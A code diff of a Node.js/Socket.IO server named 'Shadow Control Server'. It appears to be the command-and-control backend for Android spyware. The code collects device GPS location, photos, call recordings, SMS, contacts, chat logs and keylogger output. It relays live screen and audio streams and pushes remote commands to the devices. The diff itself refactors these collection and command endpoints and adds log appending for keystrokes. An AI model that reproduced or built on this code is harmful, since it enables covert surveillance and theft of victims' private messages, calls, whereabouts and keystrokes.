@@ -47,68 +47,59 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-//  🔥 MAIN SOCKET LOGIC (FIXED & UNIFIED)
+//  🔥 MAIN SOCKET LOGIC (FIXED FOR VIDEO & COMMANDS)
 // ==================================================
 io.on('connection', (socket) => {
     
     console.log(`👤 New Connection ID: ${socket.id}`);
 
-    // ✅ FIX: Unified Room Joining (Case Insensitive)
-    const handleJoin = (roomID) => {
-        if (!roomID) return;
-        const cleanRoom = roomID.toString().trim().toUpperCase();
-        socket.join(cleanRoom);
-        console.log(`🔌 Client/Device Joined Room: ${cleanRoom}`);
+    // Unified Room Join Logic
+    const joinRoom = (roomID) => {
+        if(!roomID) return;
+        const id = roomID.toString().trim().toUpperCase();
+        socket.join(id);
+        console.log(`🔌 Joined Room: ${id}`);
     };
 
-    socket.on('join', handleJoin);
-    socket.on('join-room', handleJoin);
+    socket.on('join', joinRoom);
+    socket.on('join-room', joinRoom);
 
-    // ✅ WebRTC SIGNALING RELAY (Crucial for Video)
-    // Using io.to().emit to ensure the message reaches the target room correctly
+    // Screen Share (Direct Buffer)
+    socket.on('screen-data', (data) => {
+        if(data.room) socket.to(data.room.toString().toUpperCase()).emit('screen-data', data.image);
+    });
+
+    // Control Event (For Start/Stop Video)
+    socket.on('control-event', (data) => {
+        if(!data.room) return;
+        const target = data.room.toString().toUpperCase();
+        console.log(`🎮 Control Action: ${data.action} -> Target: ${target}`);
+        io.to(target).emit('control-event', data); 
+        
+        // Auto-trigger command for Android if starting stream
+        if(data.action === 'start') {
+            io.to(target).emit('command', 'start_stream');
+        }
+    });
+
+    // WebRTC Signaling Relay
     socket.on("offer", (data) => {
-        if (!data.target) return;
-        const target = data.target.toString().trim().toUpperCase();
-        console.log(`📡 Relaying Offer to: ${target}`);
-        io.to(target).emit("offer", data.offer || data);
+        if(data.target) io.to(data.target.toString().toUpperCase()).emit("offer", data); 
     });
 
     socket.on("answer", (data) => {
-        if (!data.target) return;
-        const target = data.target.toString().trim().toUpperCase();
-        console.log(`📡 Relaying Answer to: ${target}`);
-        io.to(target).emit("answer", data.answer || data);
+        if(data.target) io.to(data.target.toString().toUpperCase()).emit("answer", data);
     });
 
     socket.on("candidate", (data) => {
-        if (!data.target) return;
-        const target = data.target.toString().trim().toUpperCase();
-        io.to(target).emit("candidate", data.candidate || data);
+        if(data.target) io.to(data.target.toString().toUpperCase()).emit("candidate", data);
     });
 
-    // ✅ FIX: Enhanced Control Events
-    socket.on('control-event', (data) => {
-        if (!data.room) return;
-        const room = data.room.toString().trim().toUpperCase();
-        console.log(`🎮 Action: ${data.action} -> Room: ${room}`);
-        
-        // Agar dashboard se 'start' click ho, toh Android ko auto-command jaye
-        if (data.action === 'start') {
-            io.to(room).emit('command', 'start_stream');
-        }
-        io.to(room).emit('control-event', data); 
-    });
-
-    // Standard Command Handling
-    socket.on('send-command', (data) => {
-        const target = (data.targetId || data.deviceId || "").toString().trim().toUpperCase();
-        if (target && data.command) {
-            console.log(`⚡ Command: ${data.command} -> ${target}`);
-            io.to(target).emit('command', data.command);
-            
-            if (!devicesStatus[target]) devicesStatus[target] = { id: target };
-            devicesStatus[target].command = data.command;
-        }
+    // Audio Stream Relay
+    socket.on('audio-stream', (blob) => {
+        socket.rooms.forEach(room => {
+            if (room !== socket.id) socket.to(room).emit('audio-stream', blob);
+        });
     });
 
     socket.on('disconnect', () => { 
@@ -116,17 +107,62 @@ io.on('connection', (socket) => {
     });
 });
 
-
-
 // ==================================================
-//  ✅ API ENDPOINTS (ALL FEATURES)
+//  ✅ STATUS & COMMAND LOGIC (BATTERY/LOCATION FIX)
 // ==================================================
 
-app.get('/', (req, res) => {
-    res.send('✅ Shadow Control Server v3.0: Online & Optimized');
+app.post('/api/status', (req, res) => {
+    try {
+        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
+        if (!device_id) return res.status(400).json({ error: "No ID" });
+
+        const id = device_id.toString().trim().toUpperCase();
+        
+        if (!devicesStatus[id]) {
+            devicesStatus[id] = { id: id, command: "none" };
+        }
+
+        // Mapping values accurately (Supports both names 'level' and 'battery')
+        devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
+        devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
+        devicesStatus[id].version = version || devicesStatus[id].version || "--";
+        devicesStatus[id].charging = (String(charging) === "true");
+        
+        devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
+        devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
+        devicesStatus[id].accuracy = accuracy || devicesStatus[id].accuracy || 0;
+        devicesStatus[id].speed = speed || devicesStatus[id].speed || 0;
+        
+        devicesStatus[id].lastSeen = Date.now();
+
+        let commandToSend = "none";
+        if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
+            commandToSend = devicesStatus[id].command;
+            devicesStatus[id].command = "none"; 
+        }
+
+        res.json({ status: "success", command: commandToSend });
+    } catch (e) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
-// UPLOAD IMAGE/GALLERY
+app.get('/api/device-status/:id', (req, res) => {
+    const id = req.params.id.toUpperCase().trim();
+    const device = devicesStatus[id];
+    if (!device) return res.json({ id: id, isOnline: false });
+    const isOnline = (Date.now() - device.lastSeen) < 60000;
+    res.json({ ...device, isOnline: isOnline });
+});
+
+app.get('/api/admin/all-devices', (req, res) => {
+    res.json(devicesStatus);
+});
+
+// ==================================================
+//  ✅ UPLOAD SYSTEM (IMAGES & AUDIO)
+// ==================================================
+
 app.post('/api/upload-image', (req, res) => {
     let { device_id, image_data, type } = req.body; 
     if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
@@ -147,11 +183,7 @@ app.post('/api/upload-image', (req, res) => {
     let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
     cloudinary.uploader.upload(base64Image, { 
-        folder: folderPath, 
-        public_id: publicId, 
-        resource_type: "image", 
-        width: 1280, 
-        quality: "auto" 
+        folder: folderPath, public_id: publicId, resource_type: "image" 
     }, (error, result) => {
         if (error) return res.status(500).json({ error: "Upload Failed" });
         io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
@@ -159,19 +191,14 @@ app.post('/api/upload-image', (req, res) => {
     });
 });
 
-// AUDIO UPLOAD
 app.post('/api/upload-audio', (req, res) => {
     let { device_id, audio_data, filename } = req.body; 
     if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
     const id = device_id.toString().trim().toUpperCase();
-    
-    let folderPath = `${id}/calls`; 
     let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
 
     cloudinary.uploader.upload(base64Audio, { 
-        folder: folderPath, 
-        public_id: filename || Date.now().toString(), 
-        resource_type: "video" 
+        folder: `${id}/calls`, public_id: filename || Date.now().toString(), resource_type: "video" 
     }, (error, result) => {
         if (error) return res.status(500).json({ error: "Upload Failed" });
         io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
@@ -179,32 +206,10 @@ app.post('/api/upload-audio', (req, res) => {
     });
 });
 
-// STATUS POLLING
-app.post('/api/status', (req, res) => {
-    try {
-        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
-        if (!device_id) return res.status(400).json({ error: "No ID" });
-        const id = device_id.toString().trim().toUpperCase();
-        
-        if (!devicesStatus[id]) devicesStatus[id] = { id: id, command: "none" };
-        devicesStatus[id] = {
-            ...devicesStatus[id],
-            model: model || "Unknown",
-            battery: battery || level || 0,
-            version: version || "--",
-            charging: (String(charging) === "true"),
-            lat: lat || 0,
-            lon: lon || 0,
-            lastSeen: Date.now()
-        };
+// ==================================================
+//  🔥 DATA STORAGE (SMS, CONTACTS, APPS)
+// ==================================================
 
-        let cmd = devicesStatus[id].command || "none";
-        devicesStatus[id].command = "none"; 
-        res.json({ status: "success", command: cmd });
-    } catch (e) { res.status(500).json({ error: "Error" }); }
-});
-
-// DATA STORAGE (SMS, CONTACTS, ETC)
 app.post('/api/upload_data', async (req, res) => { 
     let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
@@ -212,34 +217,63 @@ app.post('/api/upload_data', async (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
 
     try {
-        let finalData = typeof data === 'string' ? JSON.parse(data) : data;
-        // Basic array wrap for consistency
-        if (!Array.isArray(finalData)) finalData = [finalData];
+        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+        let finalData = parsedData;
+
+        if (type === 'contacts') {
+            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
+            const seenNumbers = new Set();
+            finalData = [];
+            for (const contact of rawList) {
+                let num = (contact.phoneNumber || contact.number || '').replace(/\s+|-/g, '');
+                if (num && !seenNumbers.has(num)) {
+                    seenNumbers.add(num);
+                    finalData.push({ name: contact.name || "Unknown", number: num });
+                }
+            }
+            finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+        } 
+        else if (!['chat_logs', 'keylogger'].includes(type)) {
+             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
+        } 
+        else {
+            // Append logic for logs
+            let existingData = [];
+            try { if (fs.existsSync(filePath)) existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
+            finalData = [...(Array.isArray(parsedData) ? parsedData : [parsedData]), ...existingData].slice(0, 5000);
+        }
 
         await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
         res.json({ status: "success" });
-    } catch (error) { res.status(500).json({ status: "error" }); }
+    } catch (error) {
+        res.status(500).json({ status: "error" });
+    }
 });
 
-// GET DATA API
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
     if (fs.existsSync(filePath)) res.sendFile(filePath);
     else res.json([]);
 });
 
-// ADMIN API
-app.get('/api/admin/all-devices', (req, res) => res.json(devicesStatus));
+// ==================================================
+//  🚀 COMMAND API
+// ==================================================
 
 app.post('/api/send-command', (req, res) => {
     let { device_id, deviceId, command } = req.body;
-    let target = (device_id || deviceId || "").toString().trim().toUpperCase();
-    if (!target) return res.status(400).json({ error: "No target" });
+    let targetID = device_id || deviceId; 
+    if (!targetID || !command) return res.status(400).json({ error: "Missing Info" });
     
-    io.to(target).emit('command', command);
-    if (!devicesStatus[target]) devicesStatus[target] = { id: target };
-    devicesStatus[target].command = command;
-    res.json({ status: "success", sentTo: target });
+    const id = targetID.toUpperCase().trim();
+    io.to(id).emit('command', command);
+    
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
+    devicesStatus[id].command = command;
+    
+    res.json({ status: "success", command: command });
 });
+
+app.get('/', (req, res) => res.send('✅ Server Running: Full Support Added'));
 
 server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
